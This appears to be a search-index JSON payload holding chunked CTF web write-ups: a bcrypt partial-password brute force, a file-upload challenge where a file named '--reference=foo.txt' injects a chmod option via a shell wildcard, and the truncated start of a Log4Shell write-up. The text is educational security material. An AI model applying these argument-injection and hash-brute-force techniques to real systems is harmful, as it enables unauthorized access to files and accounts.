{
  "requests": [
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "A detailed write-up of the Web challenge 'Bfail' from NullCon Goa HackIM CTF - 2025",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": " Challenge Presentation ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:0:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event Nullcon Goa HackIM 2025 CTF Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 500 Out of 500 total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 3/10 \ud83d\udc64 Author @gehaxelt Profile \ud83c\udfae Solves (At the time of flag submission) 21 XX% solve rate \ud83d\udcc5 Date 01-02-2025 Nullcon Goa HackIM 2025 CTF Day X \ud83e\uddbe Solved By mH4ck3r0n3 Team: QnQSec ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:1:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "\ud83d\udcdd Challenge Information To \u2018B\u2019 secure or to \u2018b\u2019 fail? Strong passwords for admins are always great, right? http://52.59.124.14:5013 ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:2:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:3:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Provided Files Files: None \ud83d\udd0d Initial Analysis ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:3:1",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "First Steps Initially, the website appears as follows: Site Presentation While inspecting the code with ChromeDevTools, I found this: Page Source Interesting, so by visiting /source, we will have the source code of the page: Source Code As we can see, it leaks the password in bytes: \\xec\\x9f\\xe0a\\x978\\xfc\\xb6:T\\xe2\\xa0\\xc9<\\x9e\\x1a\\xa5\\xfao\\xb2\\x15\\x86\\xe5$\\x86Z\\x1a\\xd4\\xca#\\x15\\xd2x\\xa0\\x0e0\\xca\\xbc\\x89T\\xc5V6\\xf1\\xa4\\xa8S\\x8a%I\\xd8gI\\x15\\xe9\\xe7$M\\x15\\xdc@\\xa9\\xa1@\\x9c\\xeee\\xe0\\xe0\\xf76 and the full password in hash: $2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK and honestly, this comment is also very interesting: # This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway... strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt()) # >>> strongpw[:71] As we can see, the leak is of the first 70 bytes of the password, while a total of 71 bytes are used. Let\u2019s proceed with the exploit. ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:4:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "\ud83d\udd2c Vulnerability Analysis ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:5:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Potential Vulnerabilities Partial Hash Exposure (bcrypt) \ud83c\udfaf Solution Path ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:5:1",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Exploitation Steps ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:6:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Initial setup The exploit was based on brute-forcing that remaining byte since 71-70=1. That\u2019s a total of 256 combinations (nothing too challenging for a brute force). Once completed, we have the full password, which we will obviously verify by converting it into a hash and comparing it with the previously obtained hash. ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:6:1",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Exploitation I wrote a Python script to do all of this, and then I executed it: python exploit.py I also sent the request directly to the server using Http, since a simple GET or POST returned Method Not Allowed. I then took the server\u2019s response, extracted the flag using a regex, and subsequently printed it. ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:6:2",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:6:3",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Approach The exploit literally follows the procedure described above: \u00a0Exploit \ud83d\udea9 Flag Capture Flag ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:7:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used Tool Purpose Python Exploit \ud83d\udca1 Key Learnings ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:8:0",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "New Knowledge I discovered that if you know part of the hash with bcrypt, you can perform a brute force. ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:8:1",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:08 From start to flag Global Ranking (At the time of flag submission) 9/535 Challenge ranking Points Earned 500 Team contribution Created: 01-02-2025 \u2022 Last Modified: 01-02-2025 Author: mH4ck3r0n3 \u2022 Team: QnQSec ",
        "date": "07/02/2025",
        "objectID": "/posts/2025/02/07/bfail/:8:2",
        "tags": [
          "\ud83d\udd13 Partial Hash Exposure",
          "\ud83d\udd11 bcrypt",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Bfail",
        "uri": "/posts/2025/02/07/bfail/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Submission' from x3CTF - 2025",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": " Challenge Presentation ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:0:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event x3CTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 500 Out of 500 total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 4/10 \ud83d\udc64 Author rebane2001 Profile \ud83c\udfae Solves (At the time of flag submission) 16 XX% solve rate \ud83d\udcc5 Date 24-01-2025 x3CTF - 2025 Day X \ud83e\uddbe Solved By xtea418 Team: QnQSec ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:1:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information Could you help us out? ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:2:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:3:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:3:1",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "First Steps Initially, the website appears as follows: Site Presentation There is a file upload section where only .txt files can be uploaded. Reading the attached files, there was only a PHP file: if (isset($_FILES['file'])) { $uploadOk = 1; $target_dir = \"/var/www/html/uploads/\"; $target_file = $target_dir . basename($_FILES[\"file\"][\"name\"]); if (file_exists($target_file)) { echo \"Sorry, file already exists.\"; $uploadOk = 0; } if ($_FILES[\"file\"][\"size\"] > 50000) { echo \"Sorry, your file is too large you need to buy Nitro.\"; $uploadOk = 0; } if (!str_ends_with($target_file, '.txt')) { echo \"Due to exploit you can only upload files with .txt extensions sorry about this but we got hacked last time so we have to check this from now on.\"; $uploadOk = 0; } // Check if $uploadOk is set to 0 by an error if ($uploadOk == 0) { echo \"Sorry, your file was not uploaded.\"; // if everything is ok, try to upload file } else { if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $target_file)) { echo \"The file \". htmlspecialchars( basename( $_FILES[\"file\"][\"name\"])). \" has been uploaded.\"; } else { echo \"Sorry, there was an error uploading your file.\"; } } $old_path = getcwd(); chdir($target_dir); // make unreadable shell_exec('chmod 000 *'); chdir($old_path); } As we can see, the files are uploaded to the /uploads folder, followed by various checks, including one on the file size and another on the extension, which must always end with .txt. Initially, I thought of uploading a malicious PHP file to read flag.txt, which was located under the uploads folder, since trying to access /uploads/flag.txt returned 403 Forbidden. I attempted to bypass the extension check with a null byte, using exploit.php%00.txt, but it didn\u2019t work. Searching online, I found another type of attack that allowed command execution through the .htaccess file. Interestingly, when I tried uploading a file starting with ., I was able to read it using the /uploads/filename route (but I quickly realized why). As we can see, a chmod 000 * command is executed right after the upload, setting all permissions to null for every file in the uploads folder. This was why accessing files through the browser returned 403 Forbidden. It is also the reason why I was able to read the files I uploaded with a . at the beginning of the name. The chmod ... * command affects all visible files but doesn\u2019t include hidden files (those starting with . or special characters, such as -). Since their permissions weren\u2019t nullified, I could still access them. From there, I did some research to better understand how chmod works and realized it was an issue of insecure file permissions. Now, let\u2019s move on to the exploit. ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:4:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "\ud83d\udd2c Vulnerability Analysis ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:5:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Potential Vulnerabilities Insecure File Permission \ud83c\udfaf Solution Path ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:5:1",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Exploitation Steps ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:6:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Initial setup After doing some research, I discovered that there is a specific flag that can be used with the chmod command, --reference=filename file, which allows you to set the permissions of the target file (passed as an argument) to match those of the reference file (like a copy-and-paste of permissions). So, I decided to exploit this flag, given that chmod was being applied to * (a wildcard indicating \u201call\u201d). By setting the permissions of all files in the folder, I thought of using this to my advantage. ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:6:1",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Exploitation The exploitation essentially relies on uploading a file named --reference=foo.txt, for example (since there is always an extension check): First Part Once the upload is done, chmod is called, and all the permissions are set to null. However, the exploit doesn\u2019t stop there. In fact, for the reference flag, you need to specify a file, as we mentioned, foo.txt, so I uploaded that file as well: Second Part Once the file is uploaded, chmod will be executed on all the files, and as soon as it reaches the file --reference=foo.txt, it will treat it as a flag in the execution of the command. This will set the permissions of all files in the folder to match those of the foo.txt file (which, being the last one uploaded, still has active read permissions because chmod hasn\u2019t been executed on it yet). As a result, the read permission for the flag.txt file will also be set, and by accessing the /uploads/flag.txt route, I was able to read the flag. ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:6:2",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:6:3",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Approach The exploit does exactly as described manually: it uses the --reference flag of chmod to apply the permissions of the foo.txt file to all the files, including flag.txt, and then retrieves the flag by accessing the /uploads/flag.txt route. \u00a0Exploit \ud83d\udea9 Flag Capture Flag ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:7:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used Tool Purpose Python Exploit \ud83d\udca1 Key Learnings ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:8:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "New Knowledge I learned that chmod ignores hidden files (those named with .something or files starting with -). I also learned that when the --reference=filename file parameter is used, it sets the permissions of the target file to match those of the file specified as the reference. ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:9:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcda References & Resources ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:10:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"
        ],
        "content": "Learning Resources https://www.tecmint.com/copy-file-permissions-and-ownership-to-another-file-in-linux/ \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:20 From start to flag Global Ranking (At the time of flag submission) 2/975 Challenge ranking Points Earned 500 Team contribution Created: 24-01-2025 \u2022 Last Modified: 24-01-2025 Author: mH4ck3r0n3 \u2022 Team: QnQSec ",
        "date": "06/02/2025",
        "objectID": "/posts/2025/02/06/submission/:11:0",
        "tags": [
          "\ud83d\udd10 Insecure File Permission",
          "\ud83d\udc89 Bash Glob Injection",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Submission",
        "uri": "/posts/2025/02/06/submission/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Sparkling Sky' from SrdnlenCTF - 2025",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": " Challenge Presentation ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:0:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event SrdnlenCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 500 Out of XXXX total \u2b50 Difficulty \ud83d\udfe1 Medium Personal Rating: 5/10 \ud83d\udc64 Author sanmatte Profile \ud83c\udfae Solves (At the time of flag submission) 49 XX% solve rate \ud83d\udcc5 Date 19-01-2025 SrdnlenCTF - 2025 Day X \ud83e\uddbe Solved By devgianlu Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:1:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up. It is forbidden to perform or attempt to perform any action against the infrastructure or the challenge itself. username: user1337 password: user1337 website: http://sparklingsky.challs.srdnlen.it:8081 ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:2:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:3:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:3:1",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
